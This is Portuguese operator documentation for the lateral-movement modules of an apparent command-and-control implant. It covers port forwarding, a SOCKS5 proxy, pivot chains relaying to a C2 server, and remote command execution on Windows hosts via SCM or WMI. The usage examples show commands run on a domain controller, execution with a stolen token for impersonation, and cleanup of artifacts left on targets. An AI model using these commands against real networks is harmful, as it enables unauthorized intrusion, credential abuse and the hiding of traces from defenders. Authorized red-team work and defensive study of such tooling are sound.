    Movimento Lateral¶

    Modulos para pivoting, tunneling e execucao remota dentro da rede alvo.

    Resumo¶

    Modulo Plataformas Descricao
    lateral.portfwd Windows, Linux, macOS Port forwarding TCP local
    lateral.socks Windows, Linux, macOS Proxy SOCKS5 completo (TCP + UDP)
    pivot Windows, Linux, macOS Relay TCP agent-to-agent para chains de pivots
    remote_exec Windows Execucao remota via SCM ou WMI

    lateral.portfwd¶

    Nome: lateral.portfwd Plataformas: Windows, Linux, macOS Descricao: Cria port forwards TCP locais no agent, redirecionando conexoes de uma porta local para um host:port de destino.

    Argumentos¶

    Nome Tipo Obrigatorio Default Descricao
    action string opcional list Acao: start, stop ou list
    listen_port string (int) obrigatorio (start) - Porta local para escutar
    listen_addr string opcional 127.0.0.1 Endereco local para bind
    target string obrigatorio (start) - Destino no formato host:port
    id string opcional (stop) - Identificador do forward (endereco de listen)

    Retorno¶

    start: 

    {
  "output": "forwarding 127.0.0.1:8080 -> 10.0.0.5:445",
  "data": {
    "status": "started",
    "listen": "127.0.0.1:8080",
    "target": "10.0.0.5:445"
  }
}

    list: 

    {
  "output": "2 active forward(s):\n127.0.0.1:8080 -> 10.0.0.5:445 (3 active connections)",
  "data": { "count": "2" }
}

    Exemplo de uso¶

    # Criar forward para RDP interno
module lateral.portfwd --action start --listen_port 3389 --target 10.0.0.5:3389

# Forward para servico web acessivel apenas internamente
module lateral.portfwd --action start --listen_port 8080 --target 192.168.1.100:80 --listen_addr 0.0.0.0

# Listar forwards ativos
module lateral.portfwd --action list

# Parar forward especifico
module lateral.portfwd --action stop --listen_port 3389

    Notas¶

    • Timeout de dial para o target: 10 segundos
    • Bind padrao em 127.0.0.1 (somente local) -- use 0.0.0.0 para acesso da rede
    • Detecta e rejeita duplicatas pelo endereco de bind
    • Suporta porta 0 (atribuida pelo OS -- o endereco real e retornado)
    • StopAll() e chamado durante shutdown do implant para limpeza
    • Copy bidirecional com CloseWrite() para half-close correto

    lateral.socks¶

    Nome: lateral.socks Plataformas: Windows, Linux, macOS Descricao: Proxy SOCKS5 completo com suporte a TCP CONNECT e UDP ASSOCIATE, autenticacao opcional e chaining de proxies.

    Argumentos¶

    Nome Tipo Obrigatorio Default Descricao
    action string opcional list Acao: start, stop, list ou list_connections
    listen_port string (int) obrigatorio (start) - Porta para escutar
    listen_addr string opcional 127.0.0.1 Endereco de bind
    username string opcional - Username para autenticacao SOCKS5
    password string opcional - Password para autenticacao SOCKS5
    upstream_proxy string opcional - Proxy SOCKS5 upstream para chaining (host:port)
    upstream_user string opcional - Username do proxy upstream
    upstream_pass string opcional - Password do proxy upstream
    id string opcional (stop) - Identificador do proxy (endereco de listen)

    Retorno¶

    start: 

    {
  "output": "SOCKS5 proxy listening on 127.0.0.1:1080",
  "data": {
    "status": "started",
    "listen": "127.0.0.1:1080"
  }
}

    list_connections: 

    {
  "output": "[{\"id\":\"...\",\"source\":\"...\",\"target\":\"...\",\"start_time\":\"...\"}]",
  "data": { "count": "3" }
}

    Exemplo de uso¶

    # SOCKS5 basico
module lateral.socks --action start --listen_port 1080

# SOCKS5 com autenticacao
module lateral.socks --action start --listen_port 1080 --username op1 --password s3cret

# SOCKS5 com proxy chain
module lateral.socks --action start --listen_port 1080 --upstream_proxy 10.0.0.5:1080

# Ver conexoes ativas
module lateral.socks --action list_connections

# Parar proxy
module lateral.socks --action stop --listen_port 1080

    Notas¶

    • Protocolo SOCKS5 (RFC 1928) completo:
      • Autenticacao: No Auth (0x00) e Username/Password (0x02)
      • Comandos: CONNECT (0x01) e UDP ASSOCIATE (0x03)
      • Tipos de endereco: IPv4, IPv6 e dominio
    • Connection tracking: cada conexao ativa e rastreada pelo connTracker com source, target e timestamp
    • Timeout de dial: 10 segundos
    • Timeout de negociacao inicial: 30 segundos
    • UDP ASSOCIATE: escuta em porta UDP efemera, relay com timeout de 5s por resposta
    • Proxy chaining: se upstream_proxy estiver configurado, todas as conexoes CONNECT sao encaminhadas via o proxy upstream

    pivot¶

    Nome: pivot Plataformas: Windows, Linux, macOS Descricao: Relay TCP opaco que encaminha envelopes criptografados entre agents internos e o servidor C2 (ou o proximo pivot na chain).

    Argumentos¶

    Nome Tipo Obrigatorio Default Descricao
    action string opcional list Acao: start, stop ou list
    listen_port string (int) obrigatorio (start) - Porta para escutar agents internos
    listen_addr string opcional 0.0.0.0 Endereco de bind (default acessivel pela rede)
    upstream string obrigatorio (start) - Endereco do C2 ou proximo pivot (host:port)
    id string opcional (stop) - Identificador do relay

    Retorno¶

    start: 

    {
  "output": "pivot relay listening on 0.0.0.0:4444 -> upstream 10.0.0.1:443",
  "data": {
    "status": "started",
    "listen": "0.0.0.0:4444",
    "upstream": "10.0.0.1:443"
  }
}

    Topologia de Exemplo¶

    Agent C (sem acesso direto) -> Agent B (pivot) -> Agent A (pivot) -> C2 Server
         192.168.2.x              192.168.1.x          10.0.0.x        internet

    Exemplo de uso¶

    # Primeiro pivot (acesso direto ao C2)
module pivot --action start --listen_port 4444 --upstream c2.example.com:443

# Segundo pivot (chained)
module pivot --action start --listen_port 4444 --upstream 192.168.1.100:4444

# Listar pivots ativos
module pivot --action list

# Parar pivot
module pivot --action stop --listen_port 4444

    Notas¶

    • Opaco: o pivot NAO decripta ou inspeciona os envelopes -- apenas relay de bytes
    • Bind padrao em 0.0.0.0 (diferente do portfwd que usa 127.0.0.1) para acessibilidade na rede
    • Timeout de dial para upstream: 10 segundos
    • Suporta encadeamento arbitrario (A -> B -> C -> ... -> servidor)
    • StopAll() e chamado durante shutdown do implant

    remote_exec¶

    Nome: remote_exec Plataformas: Windows Descricao: Executa comandos em maquinas remotas via Service Control Manager (SCM) ou WMI.

    Argumentos¶

    Nome Tipo Obrigatorio Default Descricao
    target string obrigatorio - Hostname ou IP do alvo remoto
    command string obrigatorio - Comando a executar
    method string opcional scm Metodo: scm ou wmi
    action string opcional exec Acao: exec ou cleanup
    token string (uint64) opcional - Handle de token para impersonation

    Retorno¶

    exec: 

    {
  "output": "executed on 10.0.0.5 via scm",
  "data": {
    "target": "10.0.0.5",
    "command": "cmd.exe /c whoami",
    "method": "scm",
    "action": "exec"
  }
}

    cleanup: 

    {
  "output": "cleanup completed on 10.0.0.5 via scm",
  "data": {
    "target": "10.0.0.5",
    "method": "scm",
    "action": "cleanup"
  }
}

    Exemplo de uso¶

    # Execucao remota via SCM
module remote_exec --target 10.0.0.5 --command "cmd.exe /c net user"

# Execucao via WMI
module remote_exec --target DC01.corp.local --command "powershell.exe -c Get-Process" --method wmi

# Execucao com token roubado
module remote_exec --target 10.0.0.5 --command "whoami" --token 1234

# Limpeza de artefatos no alvo
module remote_exec --target 10.0.0.5 --action cleanup --method scm

    Notas¶

    • SCM: cria um servico temporario no alvo via Service Control Manager
    • WMI: executa via Win32_Process.Create() via WMI
    • Token: quando fornecido, o token e usado para impersonation antes da conexao remota
    • Cleanup: remove artefatos deixados pela execucao (servicos temporarios, etc.)
    • Requer credenciais validas ou token com privilegios no alvo (tipicamente admin)
    • A interface RemoteExecutor e extensivel -- novos metodos podem ser adicionados
